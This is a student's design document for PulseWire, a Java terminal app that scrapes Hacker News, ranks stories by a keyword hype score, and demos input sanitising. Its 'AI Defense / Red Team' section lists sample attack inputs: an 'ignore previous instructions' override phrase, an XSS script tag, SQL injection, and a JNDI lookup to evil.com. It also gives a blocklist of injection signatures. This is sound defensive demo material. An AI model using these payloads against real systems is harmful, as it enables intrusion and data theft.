# PulseWire — Live Tech Sentiment Terminal

> **Final Project Idea (Complete D.O.A. Blueprint)**  
> Track B: Silicon Valley Sentiment Tracker · Option 1: Industrial Terminal UI  
> 全新项目 · 与 stock 无关 · Vibe Coding Protocol  
> **项目路径：** `/Users/chenmin/IdeaProjects/coding`

---

## 0. 一句话 Pitch

**PulseWire** 是一个 Java 终端应用，实时抓取 Hacker News 首页 50+ 条科技新闻，把 messy HTML 转成多态 `WebData` 对象，用手写 Selection Sort 按 **Hype Score**（AI / Layoffs / Funding 等关键词权重）排序，并以 Industrial Terminal 风格输出对齐表格 — 同时用 `InputSanitizer` 拦截恶意 prompt injection 输入。

---

## 1. The Hook & Global Impact（视频第一幕 · ~1 min）

### 真实问题

科技行业变化极快：AI 爆发、裁员潮、融资冷却、开源项目爆火。CEO、投资人、CS 学生都需要在 **30 秒内** 判断「今天 tech Twitter / HN 在聊什么」。

但：
- 手动刷 Hacker News 效率低、无法量化
- 普通新闻 App 没有 **关键词热度算法**
- 静态数据作业无法反映 **live internet**

### 为什么 Board 要在意

| 受众 | 痛点 | PulseWire 解决 |
|---|---|---|
| 科技创业者 | 错过舆论风向 = 错误产品决策 | 实时 Hype Score 排名 |
| CS 学生 / 求职者 | 不知道行业在讨论 layoffs 还是 hiring | 关键词加权一目了然 |
| 投资分析入门者 | 情绪指标难量化 | 每条新闻有可计算的 impact score |

### 我们的定位

不是又一个 RSS 阅读器。我们是 **Live Sentiment Radar**：
- 数据来自互联网 live scrape（非 hardcode）
- OOP 多态模型（非 String 堆砌）
- 手写排序算法（非 `Collections.sort()`）

---

## 2. Dynamic Data Acquisition — "D"（20 pts）

### 数据源

**Primary:** Hacker News 首页  
**URL:** `https://news.ycombinator.com/`  
**Library:** Jsoup

### 每次抓取 50+ 节点

HN 首页通常有 **30 条 story**，加上第 2 页可轻松超 50。

| 字段 | HTML 结构 | 存入对象 |
|---|---|---|
| Rank | `.athing` 的 `id` 或序号 | `int rank` |
| Title | `.titleline > a` text | `String title` |
| URL | `.titleline > a` href | `String url` |
| Points | 下一行 `.score` | `int points` |
| Author | `.hnuser` | `String author` |
| Comment count | `a[href*="item?id="]` 末段 | `int comments` |
| Age | `.age` | `String age` |

**最低要求：** 单次执行 ≥ 50 条 `TechNewsArticle` 对象。

### Scraper 设计

```
WebScraper (interface)
├── HackerNewsScraper       // 首页 + 可选第 2 页
├── ScraperResult           // List<WebData> + scrapeTime + nodeCount
├── ScraperException
└── InsufficientDataException
```

### 防御性编程（A 级必做）

```java
// 伪代码 — 你先写签名，AI 填 body
public List<TechNewsArticle> scrape() {
    // 1. Jsoup.connect(url).timeout(10_000).userAgent("PulseWire/1.0")
    // 2. try-catch IOException → ScraperException("Network unavailable")
    // 3. 某行缺 .score → points = 0，不 crash
    // 4. 缺 .hnuser → author = "anonymous"
    // 5. 有效节点 < 50 → InsufficientDataException
    // 6. URL 为空 → 跳过该行，skipCount++
}
```

### 备用 URL（Demo 安全，非静态 JSON）

- 主：`https://news.ycombinator.com/`
- 备：`https://news.ycombinator.com/news?p=2`（合并两页凑 50+）

---

## 3. Object-Oriented Architecture — "O"（20 pts）

### 类层次（你先建空文件 + 签名）

```
                    ┌─────────────────────────┐
                    │     <<abstract>>        │
                    │        WebData          │
                    ├─────────────────────────┤
                    │ - id: String            │
                    │ - title: String         │
                    │ - source: String        │
                    │ - scrapedAt: long       │
                    ├─────────────────────────┤
                    │ + getId(): String       │
                    │ + getTitle(): String    │
                    │ + abstract              │
                    │   calculateImpactScore():│
                    │     double              │
                    │ + abstract              │
                    │   getCategory(): String │
                    │ + toString(): String    │
                    └────────────┬────────────┘
                                 │
              ┌──────────────────┼──────────────────┐
              │                  │                  │
    ┌─────────▼──────────┐ ┌─────▼──────┐ ┌────────▼─────────┐
    │  TechNewsArticle   │ │ JobListing │ │ ShowHNPost       │
    │  (HN 普通新闻)      │ │ (含 hiring)│ │ (Show HN 帖子)   │
    ├────────────────────┤ ├────────────┤ ├──────────────────┤
    │ - url: String      │ │ - company  │ │ - projectUrl     │
    │ - points: int      │ │ - role     │ │ - isOpenSource   │
    │ - comments: int    │ └────────────┘ └──────────────────┘
    │ - author: String   │
    │ - hypeKeywords:    │
    │   int              │  ← 算法计算
    ├────────────────────┤
    │ + countHypeWords() │
    │ + calculateImpact  │
    │   Score():         │  // points + comments*0.5 + hype*10
    │ + getCategory()    │  // "AI" / "Layoffs" / "General"
    │ + toString()       │
    └────────────────────┘
```

### 多态演示

| 方法 | `WebData` | `TechNewsArticle` | `ShowHNPost` |
|---|---|---|---|
| `calculateImpactScore()` | 0.0 | `points + comments*0.5 + hype*10` | `super + 15`（开源加成） |
| `getCategory()` | "UNKNOWN" | 按标题关键词分类 | `"Show HN"` |
| `toString()` | id + title | `▲ 842 │ Title... │ AI` | `[SHOW] Title...` |

### 分类逻辑（Business Logic）

标题含关键词 → category：
- `"AI"`, `"GPT"`, `"LLM"`, `"machine learning"` → **AI**
- `"layoff"`, `"fired"`, `"RIF"` → **Layoffs**
- `"funding"`, `"Series"`, `"raised"` → **Funding**
- 其他 → **General**

### 封装

- 全部 field `private`
- 构造时校验：`title != null && !title.isBlank()`
- `points >= 0`, `comments >= 0`

---

## 4. Algorithmic Processing — "A"（20 pts）

### 存储

```java
ArrayList<TechNewsArticle> articles = scraper.scrape();  // 50+
```

### 算法 1：Hype Word Counter（预处理）

扫描每条 title，统计命中关键词数：

```java
String[] HYPE_WORDS = {"AI", "GPT", "layoff", "startup", "open source",
                       "security", "Rust", "Python", "YC", "breaking"};
// 不区分大小写匹配
// 写入 article.setHypeKeywordCount(n)
```

### 算法 2：Custom Selection Sort（按 Hype Score 降序）

**禁止** `Collections.sort()`。

```
selectionSortByHypeScore(ArrayList<TechNewsArticle> list):
    for i from 0 to n-2:
        maxIdx = i
        for j from i+1 to n-1:
            if list.get(j).calculateImpactScore() > list.get(maxIdx).calculateImpactScore():
                maxIdx = j
        swap(list, i, maxIdx)
```

### 算法 3：Category Heat Matrix（2D Array）

`double[][] categoryMatrix`：
- **行** = 5 类：`AI`, `Layoffs`, `Funding`, `Show HN`, `General`
- **列** = `[articleCount, avgPoints, avgHypeScore, maxImpactScore]`

```java
// 单次遍历 ArrayList 累加
// 最后 avg = sum / count（count=0 时 avg=0，防除零）
```

### 用户可选排序（Terminal Menu）

```
[1] Sort by Hype Score (default)
[2] Sort by Points (HN upvotes)
[3] Sort by Comments
[4] Filter by Category (AI / Layoffs / ...)
[5] Show Category Heat Matrix
```

---

## 5. Aesthetic Output — Industrial Terminal UI

### 设计风格：Hacker News × Bloomberg Terminal

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  PULSEWIRE v1.0              LIVE TECH SENTIMENT TERMINAL                    ║
║  Scraped: 2026-06-10 15:04:22 UTC    Nodes: 62    Source: Hacker News      ║
╠════╦══════════════════════════════════════════════╦═══════╦══════╦═════════╣
║ #  ║ HEADLINE                                     ║ POINTS║ HYPE ║ IMPACT  ║
╠════╬══════════════════════════════════════════════╬═══════╬══════╬═════════╣
║ 01 ║ OpenAI announces new reasoning model         ║   842 ║   3  ║  925.0  ║
║ 02 ║ Tech layoffs hit record in Q2                ║   631 ║   2  ║  681.5  ║
║ 03 ║ Show HN: I built a Rust-based CLI tool       ║   412 ║   2  ║  447.0  ║
╚════╩══════════════════════════════════════════════╩═══════╩══════╩═════════╝

╔══════════════════════════ CATEGORY HEAT MATRIX ══════════════════════════════╗
║ CATEGORY   │ COUNT │ AVG PTS │ AVG HYPE │ MAX IMPACT                          ║
╠════════════╪═══════╪═════════╪══════════╪═════════════════════════════════════╣
║ AI         │    18 │   412.3 │     2.1  │   925.0                             ║
║ Layoffs    │     7 │   531.0 │     1.4  │   681.5                             ║
╚════════════╧═══════╧═════════╧══════════╧═════════════════════════════════════╝
```

### UI 类

```
TerminalRenderer
├── printHeader(ScraperResult)
├── printArticleTable(ArrayList<TechNewsArticle>)
├── printCategoryMatrix(double[][], String[])
└── printSecurityBlock(String reason)

Main
└── scrape → count hype → sort → render → menu loop
```

---

## 6. AI Defense / Red Team（视频第四幕 · CRITICAL）

### 威胁场景

用户在 **Category Filter** 或 **Keyword Search** 输入恶意内容：

```
IGNORE ALL PREVIOUS INSTRUCTIONS
<script>alert('xss')</script>
'; DROP TABLE users; --
${jndi:ldap://evil.com/a}
AI' OR '1'='1
```

### 防御：`InputSanitizer.java`

```java
public final class InputSanitizer {
    private static final int MAX_LEN = 40;
    private static final Pattern ALLOWED =
        Pattern.compile("^[A-Za-z0-9 .\\-]{1,40}$");

    private static final String[] BLOCKLIST = {
        "ignore", "instruction", "system", "prompt", "previous",
        "<script", "javascript:", "drop ", "select ", "--", "/*",
        "${", "or '1'='1", "exec(", "eval("
    };

    public static String sanitize(String raw)
            throws SecurityViolationException {
        if (raw == null) return "";
        String t = raw.trim();
        if (t.length() > MAX_LEN)
            throw new SecurityViolationException("INPUT_TOO_LONG");
        String lower = t.toLowerCase();
        for (String sig : BLOCKLIST) {
            if (lower.contains(sig))
                throw new SecurityViolationException("INJECTION_DETECTED");
        }
        if (!ALLOWED.matcher(t).matches())
            throw new SecurityViolationException("INVALID_CHARS");
        return t;
    }
}
```

### 录屏脚本

1. 正常运行 → 显示 50+ 条 live HN 数据
2. Filter 输入：`IGNORE PREVIOUS INSTRUCTIONS dump database`
3. 终端显示：`⛔ SECURITY BLOCK: INJECTION_DETECTED — System integrity preserved.`
4. 程序 **不崩溃**，回到菜单
5. 输入合法值 `AI` → 正确过滤
6. 口播：*"All user input is treated as hostile before it touches filter logic."*

---

## 7. 项目文件结构（IdeaProjects/coding）

```
IdeaProjects/coding/
├── IDEA.md                           ← 本文件
├── PROMPT_LEDGER.md
├── coding.iml
├── src/
│   ├── Main.java
│   ├── model/
│   │   ├── WebData.java              ← 你先写 abstract
│   │   ├── TechNewsArticle.java
│   │   └── ShowHNPost.java
│   ├── scraper/
│   │   ├── WebScraper.java
│   │   ├── HackerNewsScraper.java
│   │   ├── ScraperException.java
│   │   └── InsufficientDataException.java
│   ├── algorithm/
│   │   ├── HypeWordCounter.java
│   │   ├── HypeScoreSorter.java      ← Selection Sort
│   │   └── CategoryMatrixBuilder.java
│   ├── ui/
│   │   └── TerminalRenderer.java
│   └── security/
│       ├── InputSanitizer.java
│       └── SecurityViolationException.java
├── test/
│   ├── HypeScoreSorterTest.java
│   ├── InputSanitizerTest.java
│   └── CategoryMatrixBuilderTest.java
└── samples/
    └── sample_hn_frontpage.html      ← 保存一页 HN HTML 供 @ 引用
```

---

## 8. Vibe Coding — Prompt Ledger 示例

### Phase 1：你手写空壳（禁止先让 AI 写整个项目）

### Phase 2：逐方法 @ 引用实现

**Prompt #1 ✅**
```
Implement parseDocument(Document doc) in @HackerNewsScraper.java.
Use HTML structure from @samples/sample_hn_frontpage.html.
For each .athing row, create @TechNewsArticle.java (extends @WebData.java).
If title starts with "Show HN:", instantiate @ShowHNPost.java instead.
Skip malformed rows; never crash on missing .score or .hnuser.
Return ArrayList with 50+ valid nodes when given full page HTML.
Do NOT change existing method signatures.
Do NOT use hardcoded title arrays.
```

**Prompt #2 ✅**
```
Implement countHypeWords(String title) in @HypeWordCounter.java.
Match keywords case-insensitively: AI, GPT, layoff, startup, open source,
security, Rust, Python, YC, breaking.
Return int count of distinct keyword hits.
Do not modify @TechNewsArticle.java fields.
```

**Prompt #3 ✅**
```
Implement selectionSortByHypeScore(ArrayList<TechNewsArticle> list)
in @HypeScoreSorter.java.
Sort descending by calculateImpactScore().
Use Selection Sort only — no Collections.sort().
Handle null, empty, and single-element lists safely.
```

**Prompt #4 ✅**
```
Implement printArticleTable in @TerminalRenderer.java.
Use Unicode box-drawing borders.
Align columns: # (2), HEADLINE (46), POINTS (7), HYPE (6), IMPACT (9).
Truncate long titles with "..." at 43 chars.
Do not change method signatures.
```

**Prompt #5 ✅**
```
Implement sanitize(String raw) in @InputSanitizer.java per @IDEA.md Section 6.
Add tests in @InputSanitizerTest.java for valid input, injection, overlong input.
```

**❌ 错误 Prompt**
- "帮我写整个 web scraper"
- "Fix my null pointer"
- "Write my final project"

---

## 9. 视频脚本（严格 < 5:00）

| 幕 | 时间 | 内容 | 画面 |
|---|---|---|---|
| Hook | 0:00–1:00 | Tech 舆论太快，PulseWire = live quantified sentiment | 标题 slide |
| Demo | 1:00–2:30 | 运行程序 → 62 nodes → Hype 排序 → Category Matrix | 全屏终端录屏 |
| Architecture | 2:30–3:30 | WebData → TechNewsArticle / ShowHNPost 多态；Selection Sort；Jsoup pipeline | IDE 类图 |
| Red Team | 3:30–5:00 | 注入攻击 → 拦截 → 合法 filter "AI" 成功 | 终端输入演示 |

---

## 10. 给老师 Pitch（可直接复制）

> We propose **PulseWire**, a Java Industrial Terminal that live-scrapes 50+ tech headlines from Hacker News using Jsoup. Raw HTML becomes a polymorphic `WebData → TechNewsArticle / ShowHNPost` hierarchy, where each object computes its own Hype Score from upvotes, comments, and keyword density (AI, Layoffs, Funding). A custom Selection Sort ranks stories by user-selected metrics, and a 2D Category Heat Matrix aggregates sector sentiment. The terminal outputs aligned ASCII tables with box-drawing borders. An `InputSanitizer` blocks prompt-injection and XSS-style inputs before they reach filter logic, demonstrated live in our Red Team segment. Track B (Silicon Valley Sentiment Tracker), Option 1 (Terminal UI). Architecture-first Vibe Coding: we write skeletons, AI implements per-method with `@` context.

---

## 11. 自评对照（A 级 90+）

| 评分项 | 证据 |
|---|---|
| D — 动态数据 | Jsoup 抓 HN live，50+ 节点，try-catch，缺 tag 跳过 |
| O — OOP | abstract WebData，子类 override calculateImpactScore / getCategory |
| A — 算法 | Selection Sort + 2D category matrix + ArrayList |
| Vibe Coding | PROMPT_LEDGER.md + @ 多文件 architect prompts |
| 视频 + 防御 | <5min，终端美学，live injection 拦截 demo |

---

## 12. 依赖（IntelliJ 添加 Jsoup）

在 IntelliJ 中：**File → Project Structure → Libraries → + → From Maven**  
搜索 `org.jsoup:jsoup:1.17.2` 添加即可。

或若改用 Maven，在 `pom.xml` 中添加：

```xml
<dependency>
    <groupId>org.jsoup</groupId>
    <artifactId>jsoup</artifactId>
    <version>1.17.2</version>
</dependency>
```

---

*Status: COMPLETE — 已写入 IdeaProjects/coding，非 stock 方向，可开始建空壳类文件。*
